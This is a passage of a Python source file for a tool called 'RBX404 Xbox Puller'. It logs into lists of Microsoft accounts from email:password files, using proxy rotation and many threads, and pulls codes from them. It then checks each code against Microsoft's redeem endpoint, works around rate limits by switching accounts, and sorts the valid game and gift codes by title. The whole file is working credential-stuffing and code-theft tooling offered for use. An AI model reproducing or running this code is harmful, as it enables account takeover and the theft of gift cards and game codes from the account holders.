"sc_emptyresultcheck","sc_enablecartcreationerrorparsing","sc_enablekakaopay","sc_errorpageviewfix","sc_errorstringsts","sc_euomnibusprice","sc_expandedpurchasespinner","sc_extendpagetagtooverride","sc_fetchlivepersonfromparentwindow","sc_fincastlebuynowallowlist","sc_fincastlebuynowv2strings","sc_fincastlecalculation","sc_fincastlecallerapplicationidcheck","sc_fincastleui","sc_fingerprinttagginglazyload","sc_fixforcalculatingtax","sc_fixredeemautorenew","sc_flexibleoffers","sc_flexsubs","sc_giftingtelemetryfix","sc_giftlabelsupdate","sc_giftserversiderendering","sc_globalhidecssphonenumber","sc_greenshipping","sc_handledccemptyresponse","sc_hidegcolinefees","sc_hidesubscriptionprice","sc_highresolutionimageforredeem","sc_hipercard","sc_imagelazyload","sc_inlineshippingselectormsa","sc_inlinetempfix","sc_isnegativeoptionruleenabled","sc_isremovesubardigitalattach","sc_jarvisconsumerprofile","sc_jarvisinvalidculture","sc_klarna","sc_lineitemactionts","sc_livepersonlistener","sc_loadingspinner","sc_lowbardiscountmap","sc_mapinapppostdata","sc_marketswithmigratingcssphonenumber","sc_moraycarousel","sc_moraystyle","sc_moraystylefull","sc_narratoraddress","sc_newcheckoutselectorforxboxcom","sc_newconversionurl","sc_newflexiblepaymentsmessage","sc_newrecoprod","sc_noawaitforupdateordercall","sc_norcalifornialaw","sc_norcalifornialawlog","sc_norcalifornialawstate","sc_nornewacceptterms","sc_officescds","sc_optionalcatalogclienttype","sc_ordercheckoutfix","sc_orderpisyncdisabled","sc_orderstatusoverridemstfix","sc_outofstock","sc_passthroughculture","sc_paymentchallengets","sc_paymentoptionnotfound","sc_paymentsessioninsummarypage","sc_pidlignoreesckey","sc_pitelemetryupdates","sc_preloadpidlcontainerts","sc_productforlicenseterms","sc_productimageoptimization","sc_prominenteddchange","sc_promocode","sc_promocodecheckout","sc_purchaseblock","sc_purchaseblockerrorhandling","sc_purchasedblocked","sc_purchasedblockedby","sc_quantitycap","sc_railv2","sc_reactcheckout","sc_readytopurchasefix","sc_redeemfocusforce","sc_reloadiflineitemdiscrepancy","sc_removepaddingctalegaltext","sc_removeresellerforstoreapp","sc_resellerdetail","sc_restoregiftfieldlimits","sc_returnoospsatocart","sc_routechangemessagetoxboxcom","sc_rspv2","sc_scenariotelemetryrefactor","sc_separatedigitallicenseterms","sc_setbehaviordefaultvalue","sc_shippingallowlist","sc_showcontactsupportlink","sc_showtax","sc_skippurchaseconfirm","sc_skipselectpi","sc_splipidltresourcehelper","sc_splittaxv2","sc_staticassetsimport","sc_surveyurlv2","sc_taxamountsubjecttochange","sc_testflight","sc_twomonthslegalstringforcn","sc_updateallowedpaymentmethodstoadd","sc_updatebillinginfo","sc_updatedcontactpreferencemarkets","sc_updateformatjsx","sc_updatetosubscriptionpricev2","sc_updatewarrantycompletesurfaceproinlinelegalterm","sc_updatewarrantytermslink","sc_usefullminimaluhf","sc_usehttpsurlstrings","sc_uuid","sc_xboxcomnosapi","sc_xboxrecofix","sc_xboxredirection","sc_xdlshipbuffer"],
                "tokenIdentifierValue": code,
                "supportsCsvTypeTokenOnly": False,
                "buyNowScenario": "redeem",
                "clientContext": {
                    "client": "AccountMicrosoftCom",
                    "deviceFamily": "Web"
                }
            }

            if prepare_redeem_executor:
                future = prepare_redeem_executor.submit(prepare_redeem_api_call, session, code, headers, payload)
                response = future.result(timeout=35)
            else:
                response = prepare_redeem_api_call(session, code, headers, payload)

            if not response:
                return {"status": "ERROR", "message": "Request failed"}
        except Exception as e:
            return {"status": "ERROR", "message": f"Request failed: {str(e)}"}

        if response.status_code == 429:
            return {"status": "RATE_LIMITED", "message": "Account rate limited (HTTP 429)"}

        if response.status_code != 200:
            return {"status": "ERROR", "message": f"HTTP {response.status_code}"}

        data = response.json()

        if "tokenType" in data and data["tokenType"] == "CSV":
            value = data.get("value")
            currency = data.get("currency")
            return {"status": "BALANCE_CODE", "message": f"{code} | {value} {currency}"}

        if "errorCode" in data and data["errorCode"] == "TooManyRequests":
            return {"status": "RATE_LIMITED", "message": "Rate limited"}

        if "error" in data and isinstance(data["error"], dict) and "code" in data["error"]:
            if data["error"]["code"] == "TooManyRequests" or "rate" in data["error"].get("message", "").lower():
                return {"status": "RATE_LIMITED", "message": "Rate limited"}

        if "events" in data and "cart" in data["events"] and data["events"]["cart"]:
            cart_event = data["events"]["cart"][0]
            if "type" in cart_event and cart_event["type"] == "error":
                if cart_event.get("code") == "TooManyRequests" or "TooManyRequests" in str(cart_event):
                    return {"status": "RATE_LIMITED", "message": "Rate limited"}
            if "data" in cart_event and "reason" in cart_event["data"]:
                reason = cart_event["data"]["reason"]
                if "TooManyRequests" in reason or "RateLimit" in reason:
                    return {"status": "RATE_LIMITED", "message": f"Rate limited ({reason})"}
                if reason == "RedeemTokenAlreadyRedeemed":
                    return {"status": "REDEEMED", "message": f"{code} | REDEEMED"}
                elif reason in ["RedeemTokenExpired", "LegacyTokenAuthenticationNotProvided", "RedeemTokenNoMatchingOrEligibleProductsFound"]:
                    return {"status": "EXPIRED", "message": f"{code} | EXPIRED"}
                elif reason == "RedeemTokenStateDeactivated":
                    return {"status": "DEACTIVATED", "message": f"{code} | DEACTIVATED"}
                elif reason == "RedeemTokenGeoFencingError":
                    return {"status": "REGION_LOCKED", "message": f"{code} | REGION_LOCKED"}
                elif reason in ["RedeemTokenNotFound", "InvalidProductKey", "RedeemTokenStateUnknown"]:
                    return {"status": "INVALID", "message": f"{code} | INVALID"}
                else:
                    return {"status": "INVALID", "message": f"{code} | INVALID"}

        if "products" in data and len(data["products"]) > 0:
            product_info = data.get("productInfos", [{}])[0]
            product_id = product_info.get("productId")
            for product in data["products"]:
                if product.get("id") == product_id and "sku" in product and product["sku"]:
                    product_title = product["sku"].get("title", "Unknown Title")
                    is_pi_required = product_info.get("isPIRequired", False)
                    st = "VALID_REQUIRES_CARD" if is_pi_required else "VALID"
                    return {"status": st, "product_title": product_title, "message": f"{code} | {product_title}"}
                elif product.get("id") == product_id:
                    product_title = product.get("title", "Unknown Title")
                    is_pi_required = product_info.get("isPIRequired", False)
                    st = "VALID_REQUIRES_CARD" if is_pi_required else "VALID"
                    return {"status": st, "product_title": product_title, "message": f"{code} | {product_title}"}

        return {"status": "UNKNOWN", "message": f"{code} | UNKNOWN"}

    except Exception as e:
        return {"status": "ERROR", "message": f"{code} | Error: {str(e)}"}

def validate_code(session, code, force_refresh_ids=False, prepare_redeem_executor=None):
    try:
        result = validate_code_primary(session, code, force_refresh_ids, prepare_redeem_executor)
        status = result.get('status', 'ERROR')
        message = result.get('message', 'Unknown')

        color_map = {
            'VALID': 'bold green',
            'VALID_REQUIRES_CARD': 'bold yellow',
            'BALANCE_CODE': 'bold green',
            'REDEEMED': 'red',
            'EXPIRED': 'red',
            'DEACTIVATED': 'red',
            'INVALID': 'dim red',
            'REGION_LOCKED': 'magenta',
            'UNKNOWN': 'yellow',
            'RATE_LIMITED': 'bold yellow',
            'ERROR': 'bold red',
        }

        color = color_map.get(status, 'white')

        if status != 'RATE_LIMITED':
            display_msg = message
            if status in ['VALID', 'VALID_REQUIRES_CARD']:
                title = result.get('product_title', '')
                if title:
                    display_msg = f"{code} | {title}"
            with print_lock:
                console.print(f"  [{color}]{display_msg}[/]")

        return result
    except Exception as e:
        return {"status": "ERROR", "message": str(e)}

def process_code_check(session, code, email, result_files, processed_codes_lock, processed_codes, rate_limited_accounts, prepare_redeem_executor=None):
    try:
        with processed_codes_lock:
            if code in processed_codes:
                return True, False

        result = validate_code(session, code, force_refresh_ids=False, prepare_redeem_executor=prepare_redeem_executor)
        status = result.get('status', 'ERROR')

        if status == 'ERROR':
            stats.increment('errors')
            return False, False

        elif status == 'RATE_LIMITED':
            stats.increment('rate_limited')
            if rate_limited_accounts is not None and email not in rate_limited_accounts:
                with print_lock:
                    console.print(f"  [yellow]⚡ {email[:25]}... rate-limited[/]")
                rate_limited_accounts.append(email)
            return False, True

        else:
            # Map status to file and stats
            status_map = {
                'VALID': ('VALID', 'valid'),
                'VALID_REQUIRES_CARD': ('VALID_REQUIRES_CARD', 'valid_card'),
                'BALANCE_CODE': ('VALID', 'balance_codes'),
                'REDEEMED': ('INVALID', 'redeemed'),
                'EXPIRED': ('INVALID', 'expired'),
                'DEACTIVATED': ('INVALID', 'invalid'),
                'INVALID': ('INVALID', 'invalid'),
                'REGION_LOCKED': ('REGION_LOCKED', 'region_locked'),
                'UNKNOWN': ('UNKNOWN', 'unknown'),
            }

            file_key, stat_key = status_map.get(status, ('INVALID', 'invalid'))
            stats.increment(stat_key)
            stats.increment('checked')

            # Also count valid and balance_code to valid stat
            if status == 'VALID':
                stats.increment('valid')
                stats.valid -= 1  # already incremented above, fix
            if status == 'BALANCE_CODE':
                stats.increment('valid')

            result_line = f"{result.get('message', f'{code} | {status}')}\n"

            with processed_codes_lock:
                if code not in processed_codes:
                    processed_codes.add(code)
                    if file_key in result_files:
                        try:
                            with open(result_files[file_key], 'a', encoding='utf-8') as f:
                                f.write(result_line)
                        except:
                            pass

            return True, False

    except Exception as e:
        stats.increment('errors')
        return False, False

def process_codes_for_account(account, codes_queue, result_files, processed_codes_lock, processed_codes, total_codes, prepare_redeem_executor=None, proxy=None, rate_limited_accounts=None):
    email, password = account
    session = login_microsoft_account(email, password, proxy)

    if not session:
        with print_lock:
            console.print(f"  [red]❌ Invalid: {email[:30]}...[/]")
        return

    with print_lock:
        console.print(f"  [green]✅ Logged in: {email[:30]}...[/]")

    empty_attempts = 0
    max_empty = 3

    while True:
        if rate_limited_accounts is not None and email in rate_limited_accounts:
            return

        try:
            code = codes_queue.get(timeout=5)
            empty_attempts = 0
        except queue.Empty:
            empty_attempts += 1
            with processed_codes_lock:
                remaining = total_codes - len(processed_codes)
            if remaining <= 0 or empty_attempts >= max_empty:
                return
            continue

        try:
            success, is_rate_limited = process_code_check(
                session, code, email, result_files,
                processed_codes_lock, processed_codes, rate_limited_accounts,
                prepare_redeem_executor
            )
            if is_rate_limited:
                codes_queue.put(code)
                return
            elif not success:
                codes_queue.put(code)
        except:
            codes_queue.put(code)
        finally:
            codes_queue.task_done()

# ============================================================================
# SORTING FUNCTIONS
# ============================================================================

def extract_game_type(game_name):
    gn = game_name.upper()
    patterns = {
        'SUNSET SARSAPARILLA': '🥤 Sunset Sarsaparilla Bundle',
        'RAINBOW SIX SIEGE': '🔫 Rainbow Six Siege',
        'SKATE': '🛹 Skate Supercharge Pack',
        'MADDEN NFL': '🏈 Madden NFL Supercharge Pack',
        'WARFRAME': '⚔️ Warframe Bundle',
        'THRONE AND LIBERTY': '👑 Throne and Liberty',
        'DRIFT BUNDLE': '🚗 Drift Bundle',
        'PSO2:NGS': '⭐ PSO2:NGS Monthly Bonus',
        'PHANTASY STAR': '⭐ PSO2:NGS Monthly Bonus',
        'XBOX GAME PASS': '🎮 Xbox Game Pass',
        'GAME PASS': '🎮 Xbox Game Pass',
        'EA PLAY': '🎮 EA Play',
        'FORTNITE': '🎮 Fortnite',
        'CALL OF DUTY': '🔫 Call of Duty',
        'MINECRAFT': '⛏️ Minecraft',
        'HALO': '🔫 Halo',
        'FORZA': '🏎️ Forza',
        'GEARS': '⚙️ Gears',
        'SEA OF THIEVES': '🏴‍☠️ Sea of Thieves',
        'DESTINY': '🌟 Destiny',
        'APEX': '🔫 Apex Legends',
        'ROBLOX': '🎮 Roblox',
    }
    for keyword, label in patterns.items():
        if keyword in gn:
            return label
    if 'BUNDLE' in gn:
        return '🎁 Game Bundle'
    if 'PACK' in gn:
        return '📦 Game Pack'
    if 'WINTER' in gn and 'XBOX BENEFITS' in gn:
        return '❄️ Winter Xbox Benefits Pack'
    if 'JANG SAO' in gn:
        return '🏆 Jang Sao Champions Bundle'
    return '🎮 Other Games'

def format_game_codes_output(game_groups):
    lines = []
    sorted_groups = sorted(game_groups.items(), key=lambda x: (-len(x[1]), x[0]))
    lines.append("👹 RBX404 XBOX PULLER - SORTED CODES 👹")
    lines.append("=" * 60)
    lines.append(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    lines.append("")

    total_codes = 0
    all_codes_set = set()

    for game_type, codes_list in sorted_groups:
        count = len(codes_list)
        total_codes += count
        lines.append(f"📋 {game_type} ({count} codes)")
        lines.append("-" * 50)
        codes_list.sort(key=lambda x: x[0])
        code_counts = {}
        for code, game_name in codes_list:
            all_codes_set.add(code)
            if code not in code_counts:
                code_counts[code] = []
            code_counts[code].append(game_name)
        for code, game_names in sorted(code_counts.items()):
            if len(game_names) == 1:
                lines.append(f"  {code} | {game_names[0]}")
            else:
                lines.append(f"  {code} (x{len(game_names)}) | {game_names[0]}")
        lines.append("")

    lines.append("📊 SUMMARY")
    lines.append("=" * 60)
    lines.append(f"Total unique codes: {len(all_codes_set)}")
    lines.append(f"Total code entries: {total_codes}")
    lines.append(f"Game categories: {len(game_groups)}")
    return "\n".join(lines) + "\n"

def sort_codes_from_file(file_path):
    """Sort codes from a given file"""
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            all_codes = [line.strip() for line in f if line.strip()]
    except UnicodeDecodeError:
        for enc in ['latin-1', 'cp1252', 'iso-8859-1']:
            try:
                with open(file_path, 'r', encoding=enc) as f:
                    all_codes = [line.strip() for line in f if line.strip()]
                break
            except:
                continue
        else:
            console.print("[red]❌ Could not read file[/]")
            return

    if not all_codes:
        console.print("[red]❌ No codes found[/]")
        return

    console.print(f"[cyan]🔄 Sorting {len(all_codes)} codes...[/]")

    game_groups = {}
    for code_line in all_codes:
        if '|' in code_line:
            code, game_name = code_line.split('|', 1)
            code = code.strip()
            game_name = game_name.strip()
            game_type = extract_game_type(game_name)
            if game_type not in game_groups:
                game_groups[game_type] = []
            game_groups[game_type].append((code, game_name))
        else:
            if 'Other' not in game_groups:
                game_groups['Other'] = []
            game_groups['Other'].append((code_line.strip(), 'Unknown'))

    formatted = format_game_codes_output(game_groups)

    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    os.makedirs("results", exist_ok=True)
    sorted_file = f'results/sortedcodes_{timestamp}.txt'
    with open(sorted_file, 'w', encoding='utf-8') as f:
        f.write(formatted)

    console.print(f"[green]✅ Saved to: {sorted_file}[/]")
    console.print(f"\n[yellow]📋 Preview:[/]")
    console.print(Rule())
    lines = formatted.split('\n')
    for line in lines[:30]:
        console.print(f"  {line}")
    if len(lines) > 30:
        console.print(f"  [dim]... and {len(lines) - 30} more lines[/]")
    console.print(Rule())

# ============================================================================
# MAIN OPERATIONS
# ============================================================================

def run_fetch_validate(accounts, proxies_list):
    """Full fetch + validate + sort pipeline"""
    global stats
    stats = Stats()

    all_codes = []

    # ===== FETCH =====
    fetch_threads = min(CONFIG['fetch_threads'], len(accounts), CONFIG['max_threads'])

    console.print(Panel(
        f"[bold white]🚀 FETCHING CODES[/]\n"
        f"[cyan]Accounts: {len(accounts)} | Threads: {fetch_threads} | Proxies: {len(proxies_list)}[/]",
        border_style="red", box=box.ROUNDED
    ))

    start = time.time()
    with Progress(
        SpinnerColumn(style="red"),
        TextColumn("[bold white]{task.description}"),
        BarColumn(bar_width=30, style="red", complete_style="green"),
        MofNCompleteColumn(),
        TimeElapsedColumn(),
        console=console
    ) as progress:
        task = progress.add_task("Fetching...", total=len(accounts))

        with ThreadPoolExecutor(max_workers=fetch_threads) as executor:
            futures = {
                executor.submit(fetch_account_worker, email, pwd, i+1, len(accounts), proxies_list): i
                for i, (email, pwd) in enumerate(accounts)
            }
            for future in as_completed(futures):
                codes = future.result()
                all_codes.extend(codes)
                progress.advance(task)

    elapsed = time.time() - start
    console.print(f"\n[green]✅ Fetched {len(all_codes)} codes in {elapsed:.1f}s[/]")

    if all_codes:
        with open('codes.txt', 'w', encoding='utf-8') as f:
            f.write('\n'.join(all_codes))
        console.print(f"[green]💾 Saved to codes.txt[/]")
    else:
        console.print("[yellow]⚠️ No codes fetched[/]")
        return

    # ===== VALIDATE =====
    run_validate(accounts, all_codes, proxies_list)

def run_validate(accounts, all_codes=None, proxies_list=None):
    """Validate codes"""
    global stats

    if all_codes is None:
        try:
            with open('codes.txt', 'r', encoding='utf-8') as f:
                all_codes = [line.strip().split('|')[0].strip() for line in f if line.strip()]
        except:
            console.print("[red]❌ codes.txt not found[/]")
            return

    if not all_codes:
        console.print("[red]❌ No codes to validate[/]")
        return

    if proxies_list is None:
        proxies_list = get_active_proxies()

    stats = Stats()
    stats.total = len(all_codes)

    validate_threads = min(CONFIG['validate_threads'], len(accounts), CONFIG['max_threads'])

    console.print(Panel(
        f"[bold white]🔍 VALIDATING CODES[/]\n"
        f"[cyan]Codes: {len(all_codes)} | Accounts: {len(accounts)} | Threads: {validate_threads}[/]\n"
        f"[cyan]Proxies: {len(proxies_list)}[/]",
        border_style="red", box=box.ROUNDED
    ))

    # Thread count
    try:
        user_input = Prompt.ask(
            f"[yellow]Threads[/]",
            default=str(validate_threads)
        )
        batch_size = int(user_input)
        batch_size = max(1, min(batch_size, len(accounts)))
    except:
        batch_size = validate_threads

    # Create results folder
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    results_folder = f"results/check_{timestamp}"
    os.makedirs(results_folder, exist_ok=True)

    result_files = {
        'VALID': f'{results_folder}/valid_codes.txt',
        'VALID_REQUIRES_CARD': f'{results_folder}/valid_cardrequired_codes.txt',
        'INVALID': f'{results_folder}/invalid.txt',
        'UNKNOWN': f'{results_folder}/unknown_codes.txt',
        'REGION_LOCKED': f'{results_folder}/region_locked_codes.txt',
    }

    # Create files
    for fp in result_files.values():
        with open(fp, 'a'):
            pass

    # Setup queue
    codes_queue = queue.Queue()
    for code in all_codes:
        codes_queue.put(code)

    processed_codes = set()
    processed_codes_lock = threading.Lock()
    rate_limited_accounts = []

    prepare_redeem_executor = ThreadPoolExecutor(max_workers=5)

    console.print(f"\n[cyan]⚡ Starting validation with {batch_size} threads...[/]\n")

    start = time.time()
    try:
        with ThreadPoolExecutor(max_workers=batch_size) as account_executor:
            account_futures = {
                account_executor.submit(
                    process_codes_for_account,
                    account,
                    codes_queue,
                    result_files,
                    processed_codes_lock,
                    processed_codes,
                    len(all_codes),
                    prepare_redeem_executor,
                    get_random_proxy(proxies_list) if proxies_list else None,
                    rate_limited_accounts
                ): account for account in accounts
            }
            for future in as_completed(account_futures):
                pass
    finally:
        prepare_redeem_executor.shutdown(wait=True)

    elapsed = time.time() - start

    # Results summary
    console.print("")
    result_table = Table(
        box=box.DOUBLE_EDGE,
        border_style="red",
        title=f"[bold red]👹 RESULTS ({elapsed:.1f}s)[/]",
        title_style="bold red"
    )
    result_table.add_column("Status", style="bold white", justify="center")
    result_table.add_column("Count", style="bold cyan", justify="center")
    result_table.add_row("✅ Valid", str(stats.valid))
    result_table.add_row("💰 Balance Codes", str(stats.balance_codes))
    result_table.add_row("💳 Valid (Card)", str(stats.valid_card))
    result_table.add_row("🔄 Redeemed", str(stats.redeemed))
    result_table.add_row("⏰ Expired", str(stats.expired))
    result_table.add_row("🌍 Region Locked", str(stats.region_locked))
    result_table.add_row("❌ Invalid", str(stats.invalid))
    result_table.add_row("❓ Unknown", str(stats.unknown))
    result_table.add_row("⚡ Rate Limited", str(stats.rate_limited))
    result_table.add_row("💀 Errors", str(stats.errors))
    console.print(result_table)

    # Save summary
    with open(f'{results_folder}/summary.txt', 'w', encoding='utf-8') as f:
        f.write(f"👹 RBX404 Xbox Puller - Results\n")
        f.write(f"{'='*50}\n")
        f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"Total Codes: {len(all_codes)}\n")
        f.write(f"Accounts: {len(accounts)}\n")
        f.write(f"Threads: {batch_size}\n")
        f.write(f"Time: {elapsed:.1f}s\n\n")
        f.write(f"Valid: {stats.valid}\n")
        f.write(f"Balance Codes: {stats.balance_codes}\n")
        f.write(f"Valid (Card): {stats.valid_card}\n")
        f.write(f"Redeemed: {stats.redeemed}\n")
        f.write(f"Expired: {stats.expired}\n")
        f.write(f"Region Locked: {stats.region_locked}\n")
        f.write(f"Invalid: {stats.invalid}\n")
        f.write(f"Unknown: {stats.unknown}\n")

    console.print(f"\n[green]💾 Results saved to {results_folder}/[/]")

    # Update codes.txt with remaining
    remaining_codes = [c for c in all_codes if c not in processed_codes]
    with open('codes.txt', 'w', encoding='utf-8') as f:
        f.write('\n'.join(remaining_codes))

    if rate_limited_accounts:
        console.print(f"[yellow]⚡ {len(rate_limited_accounts)} accounts got rate-limited[/]")

    # Ask to sort
    total_valid = stats.valid + stats.valid_card + stats.balance_codes
    if total_valid > 0:
        console.print(f"\n[green]🎉 Found {total_valid} valid codes![/]")
        if Confirm.ask("[yellow]Sort valid codes by game?[/]", default=True):
            valid_file = result_files['VALID']
            if os.path.exists(valid_file) and os.path.getsize(valid_file) > 0:
                sort_codes_from_file(valid_file)

# ============================================================================
# MENUS
# ============================================================================

def proxy_menu():
    clear()
    show_banner()
    console.print(Panel(
        "[bold white]🌐 PROXY MANAGEMENT[/]",
        border_style="red"
    ))

    table = Table(box=box.SIMPLE, show_header=False, border_style="dim")
    table.add_column("Option", style="bold yellow")
    table.add_column("Description", style="white")
    table.add_row("[1]", "View built-in proxies")
    table.add_row("[2]", "Test built-in proxies")
    table.add_row("[3]", "Load custom proxy file")
    table.add_row("[4]", "Back")
    console.print(table)

    choice = Prompt.ask("[yellow]Select[/]", choices=["1", "2", "3", "4"], default="4")

    if choice == '1':
        console.print(f"\n[cyan]📋 Built-in Proxies ({len(BUILTIN_PROXIES)}):[/]")
        for i, p in enumerate(BUILTIN_PROXIES, 1):
            console.print(f"  [dim]{i}. {p[:50]}...[/]")
        Prompt.ask("[dim]Press Enter[/]")
    elif choice == '2':
        console.print(f"\n[cyan]🧪 Testing {len(BUILTIN_PROXIES)} built-in proxies...[/]")
        working = 0
        for i, proxy_str in enumerate(BUILTIN_PROXIES, 1):
            try:
                proxy_dict = format_proxy(proxy_str)
                if proxy_dict:
                    r = requests.get('https://httpbin.org/ip', proxies=proxy_dict, timeout=10)
                    if r.status_code == 200:
                        working += 1
                        console.print(f"  [green]✅ [{i}] {proxy_str[:40]}...[/]")
                    else:
                        console.print(f"  [red]❌ [{i}] HTTP {r.status_code}[/]")
                else:
                    console.print(f"  [red]❌ [{i}] Invalid format[/]")
            except Exception as e:
                console.print(f"  [red]❌ [{i}] {str(e)[:30]}[/]")
        console.print(f"\n[green]✅ {working}/{len(BUILTIN_PROXIES)} working[/]")
        Prompt.ask("[dim]Press Enter[/]")
    elif choice == '3':
        file_path = select_file("Proxy file path")
        proxies = read_proxies_from_file(file_path)
        if proxies:
            console.print(f"[green]✅ Loaded {len(proxies)} proxies[/]")
        Prompt.ask("[dim]Press Enter[/]")

def settings_menu():
    while True:
        clear()
        show_banner()
        console.print(Panel("[bold white]⚙️ SETTINGS[/]", border_style="red"))

        table = Table(box=box.SIMPLE, show_header=False, border_style="dim")
        table.add_column("Option", style="bold yellow")
        table.add_column("Description", style="white")
        table.add_row("[1]", "View license status")
        table.add_row("[2]", "Thread configuration")
        table.add_row("[3]", "View current config")
        table.add_row("[4]", "Back")
        console.print(table)

        choice = Prompt.ask("[yellow]Select[/]", choices=["1", "2", "3", "4"], default="4")

        if choice == '1':
            hwid = get_hwid()
            licenses_data = fetch_licenses(LICENSE_URL)
            license_info = check_license(hwid, licenses_data)
            show_license_panel(license_info, hwid)
            Prompt.ask("[dim]Press Enter[/]")
        elif choice == '2':
            console.print(f"\n[cyan]Current: Fetch={CONFIG['fetch_threads']} | Validate={CONFIG['validate_threads']} | Max={CONFIG['max_threads']}[/]")
            try:
                ft = Prompt.ask(f"[yellow]Fetch threads[/]", default=str(CONFIG['fetch_threads']))
                CONFIG['fetch_threads'] = max(1, min(100, int(ft)))
                vt = Prompt.ask(f"[yellow]Validate threads[/]", default=str(CONFIG['validate_threads']))
                CONFIG['validate_threads'] = max(1, min(100, int(vt)))
                mt = Prompt.ask(f"[yellow]Max threads[/]", default=str(CONFIG['max_threads']))
                CONFIG['max_threads'] = max(1, min(100, int(mt)))
                save_config(CONFIG)
                console.print("[green]✅ Config saved![/]")
            except ValueError:
                console.print("[red]❌ Invalid number[/]")
            Prompt.ask("[dim]Press Enter[/]")
        elif choice == '3':
            config_table = Table(box=box.ROUNDED, border_style="cyan", title="[bold cyan]Configuration[/]")
            config_table.add_column("Key", style="bold white")
            config_table.add_column("Value", style="cyan")
            config_table.add_row("Fetch Threads", str(CONFIG['fetch_threads']))
            config_table.add_row("Validate Threads", str(CONFIG['validate_threads']))
            config_table.add_row("Max Threads", str(CONFIG['max_threads']))
            config_table.add_row("Built-in Proxies", str(len(BUILTIN_PROXIES)))
            config_table.add_row("Config File", CONFIG_FILE)
            console.print(config_table)
            Prompt.ask("[dim]Press Enter[/]")
        elif choice == '4':
            break

def main_menu():
    while True:
        clear()
        show_banner()

        # License check (silent)
        hwid = get_hwid()
        licenses_data = fetch_licenses(LICENSE_URL)
        license_info = check_license(hwid, licenses_data)

        # Status bar
        if license_info and license_info["status"] == "VALID":
            status_text = f"[green]✅ Licensed: {license_info.get('name', 'User')} | Plan: {license_info.get('plan', 'FREE')}[/]"
        else:
            status_text = "[red]❌ Unlicensed | Contact admin[/]"

        console.print(Align.center(status_text))
        console.print("")

        # Menu
        menu_table = Table(
            box=box.ROUNDED,
            border_style="red",
            show_header=False,
            padding=(0, 3)
        )
        menu_table.add_column("Option", style="bold yellow", justify="center")
        menu_table.add_column("Description", style="bold white")
        menu_table.add_column("Info", style="dim")
        menu_table.add_row("[ 1 ]", "🎮 Fetch + Validate + Sort", "Full pipeline")
        menu_table.add_row("[ 2 ]", "🔍 Validate Only", "Check existing codes.txt")
        menu_table.add_row("[ 3 ]", "📋 Sort Codes", "Sort validated codes")
        menu_table.add_row("[ 4 ]", "🌐 Proxies", "Manage proxies")
        menu_table.add_row("[ 5 ]", "⚙️  Settings", "Config & license")
        menu_table.add_row("[ 6 ]", "🚪 Exit", "Goodbye")
        console.print(Align.center(menu_table))

        console.print("")
        choice = Prompt.ask("[bold red]👹 RBX404[/] [yellow]>[/]", choices=["1", "2", "3", "4", "5", "6"], default="1")

        if choice == '1':
            # Fetch + Validate + Sort
            clear()
            show_banner()
            console.print(Panel("[bold white]📂 SELECT ACCOUNTS FILE[/]", border_style="red"))
            accounts_file = select_file("Accounts file (email:pass format)")
            accounts = read_accounts(accounts_file)
            if not accounts:
                console.print("[red]❌ No valid accounts found[/]")
                Prompt.ask("[dim]Press Enter[/]")
                continue
            console.print(f"[green]✅ Loaded {len(accounts)} accounts[/]")

            proxies_list = get_active_proxies()
            run_fetch_validate(accounts, proxies_list)
            Prompt.ask("[dim]Press Enter to return[/]")

        elif choice == '2':
            # Validate only
            clear()
            show_banner()
            console.print(Panel("[bold white]📂 SELECT ACCOUNTS FILE[/]", border_style="red"))
            accounts_file = select_file("Accounts file (email:pass format)")
            accounts = read_accounts(accounts_file)
            if not accounts:
                console.print("[red]❌ No valid accounts found[/]")
                Prompt.ask("[dim]Press Enter[/]")
                continue
            console.print(f"[green]✅ Loaded {len(accounts)} accounts[/]")

            proxies_list = get_active_proxies()
            run_validate(accounts, proxies_list=proxies_list)
            Prompt.ask("[dim]Press Enter to return[/]")

        elif choice == '3':
            # Sort codes
            clear()
            show_banner()
            console.print(Panel("[bold white]📋 SORT CODES[/]", border_style="red"))
            codes_file = select_file("Codes file to sort")
            sort_codes_from_file(codes_file)
            Prompt.ask("[dim]Press Enter to return[/]")

        elif choice == '4':
            proxy_menu()

        elif choice == '5':
            settings_menu()

        elif choice == '6':
            console.print(Panel(
                "[bold red]👹 Goodbye from RBX404 Xbox Puller![/]\n[dim]Stay powerful.[/]",
                border_style="red"
            ))
            break

# ============================================================================
# ENTRY POINT
# ============================================================================

if __name__ == '__main__':
    try:
        main_menu()
    except KeyboardInterrupt:
        console.print("\n[red]❌ Interrupted by user[/]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]💀 Fatal error: {e}[/]")
        sys.exit(1)

